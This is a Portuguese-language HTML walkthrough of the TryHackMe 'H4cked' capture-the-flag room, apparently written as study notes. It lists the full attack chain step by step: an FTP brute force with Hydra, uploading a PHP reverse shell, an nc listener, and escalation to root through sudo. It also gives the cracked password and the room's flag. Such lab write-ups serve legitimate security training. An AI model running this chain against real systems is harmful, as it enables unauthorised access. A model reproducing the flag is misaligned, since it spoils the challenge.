<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>H4cked - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>H4CKED</h1>
            <p class="subtitle">Walkthrough da sala do TryHackMe</p>
        </header>
        
        <section class="intro">
            <h2>Sala H4cked</h2>
            <p>Esta é uma sala de CTF (Capture The Flag) do TryHackMe focada em exploração de serviços FTP e escalação de privilégios através de sudo. O objetivo é explorar vulnerabilidades e obter acesso root ao sistema.</p>
            
            <a href="https://tryhackme.com/room/h4cked" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Sala no TryHackMe
            </a>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta sala ensina técnicas de brute force em FTP, upload de shells e escalação de privilégios através de configurações sudo.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV 10.10.113.52
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 21/tcp: FTP - vsftpd 2.0.8 or later</li>
                        <li>Porta 22/tcp: SSH - OpenSSH 8.2p1 Ubuntu</li>
                        <li>Porta 80/tcp: HTTP - Apache httpd 2.4.41 (Ubuntu)</li>
                    </ul>
                </div>
                
                <p>O resultado mostra três serviços principais: FTP na porta 21, SSH na porta 22 e um servidor web Apache na porta 80.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Quebra de Autenticação FTP</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Brute Force no FTP</h3>
                </div>
                <p>Utilize o Hydra para realizar um ataque de força bruta no serviço FTP:</p>
                <p>Fazer isso com o nome jenny pq foi encontrado no wireshark</p>
                
                <div class="code">
                    hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.113.52 ftp
                </div>
                
                <div class="highlight">
                    <strong>Resultado do ataque:</strong>
                    <ul>
                        <li>Login: jenny</li>
                        <li>Senha: 987654321</li>
                    </ul>
                </div>
                
                <p>As credenciais foram encontradas com sucesso, permitindo acesso ao serviço FTP.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Acesso FTP e Upload de Shell</h3>
                </div>
                <p>Conecte-se ao FTP usando as credenciais encontradas e faça upload de um shell PHP:</p>
                
                <div class="code">
                    ftp 10.10.113.52 <br>
                    Name: jenny <br>
                    Password: 987654321 <br>
                    
                    ftp> get shell.php <br>
                    ftp> mdelete shell.php <br>
                    #editar o arquivo com o ip certo e a porta (usei 4444) <br>
                    #fazer o passo 4 e depois voltar nesse terminal e fazer o resto abaixo <br>
                    ftp> put shell.php <br>
                    ftp> site chmod 777 shell.php
                </div>
                
                <div class="highlight">
                    <strong>Upload bem-sucedido:</strong> O arquivo shell.php foi enviado com permissões de execução.
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração e Shell Reverso</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Obtendo Shell Reverso</h3>
                </div>
                <p>Configure um listener na sua máquina e execute o arquivo enviado acessando via navegador:</p>
                
                <div class="code">
                    nc -nlvp 4444 <br>
                    
                    # Acessar no navegador:
                    http://10.10.113.52/shell.php
                </div>
                
                <div class="highlight">
                    <strong>Conexão reversa estabelecida:</strong> Shell reverso obtido com sucesso como usuário www-data.
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Melhorando o Shell</h3>
                </div>
                <p>Melhore o shell para uma sessão mais interativa:</p>
                
                <div class="code">
                    python3 -c 'import pty; pty.spawn("/bin/bash")'
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Mudança para Usuário Jenny</h3>
                </div>
                <p>Utilize as credenciais do FTP para mudar para o usuário Jenny:</p>
                
                <div class="code">
                    su jenny <br>
                    Password: 987654321
                </div>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Verificando Privilégios Sudo</h3>
                </div>
                <p>Verifique quais comandos o usuário Jenny pode executar com sudo:</p>
                
                <div class="code">
                    sudo -l <br>
                    [sudo] password for jenny: 987654321
                </div>
                
                <div class="highlight">
                    <strong>Resultado:</strong>
                    <ul>
                        <li>User jenny may run the following commands on ip-10-10-126-112:
                            (ALL : ALL) ALL</li>
                    </ul>
                </div>
                
                <p>O usuário Jenny tem permissão para executar qualquer comando como root usando sudo.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">8</div>
                    <h3>Obtendo Acesso Root</h3>
                </div>
                <p>Use o sudo para obter um shell como root:</p>
                
                <div class="code">
                    sudo su
                </div>
                
                <div class="highlight">
                    <strong>Escalação de privilégios bem-sucedida:</strong> Agora você tem acesso como root.
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Capturando a Flag</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">9</div>
                    <h3>Localizando a Flag</h3>
                </div>
                <p>Navegue até o diretório Reptile e capture a flag:</p>
                
                <div class="code">
                    cd /Reptile <br>
                    ls <br>
                    cat flag.txt <br>
                </div>
                
                <div class="highlight">
                    <strong>Flag capturada:</strong> dbconfdbcca403590417b4x0bbde57fdofd
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>nmap -sV</code></td>
                    <td>Escaneamento de versões de serviços</td>
                    <td>Identificar serviços em execução</td>
                </tr>
                <tr>
                    <td><code>hydra</code></td>
                    <td>Ferramenta de brute force</td>
                    <td>Quebrar autenticação FTP</td>
                </tr>
                <tr>
                    <td><code>ftp</code></td>
                    <td>Cliente FTP</td>
                    <td>Upload de arquivo malicioso</td>
                </tr>
                <tr>
                    <td><code>nc -nlvp</code></td>
                    <td>Netcat listener</td>
                    <td>Receber shell reverso</td>
                </tr>
                <tr>
                    <td><code>sudo -l</code></td>
                    <td>Listar privilégios sudo</td>
                    <td>Identificar vetores de escalação</td>
                </tr>
                <tr>
                    <td><code>sudo su</code></td>
                    <td>Escalar para root</td>
                    <td>Obter privilégios de administrador</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Escaneamento de portas revelou serviços FTP, SSH e HTTP.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-key"></i>
                        </div>
                        <h3>Quebra de Autenticação</h3>
                    </div>
                    <div class="card-content">
                        <p>Brute force no FTP revelou credenciais do usuário Jenny.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-upload"></i>
                        </div>
                        <h3>Upload de Shell</h3>
                    </div>
                    <div class="card-content">
                        <p>Upload de shell PHP através do FTP permitiu execução remota de código.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-crown"></i>
                        </div>
                        <h3>Escalação</h3>
                    </div>
                    <div class="card-content">
                        <p>Privilégios sudo do usuário Jenny permitiram escalação direta para root.</p>
                    </div>
                </div>
            </div>
        </section>
        
        <footer>
            <p>H4cked do TryHackMe - Walkthrough</p>
        </footer>
    </div>
</body>
</html>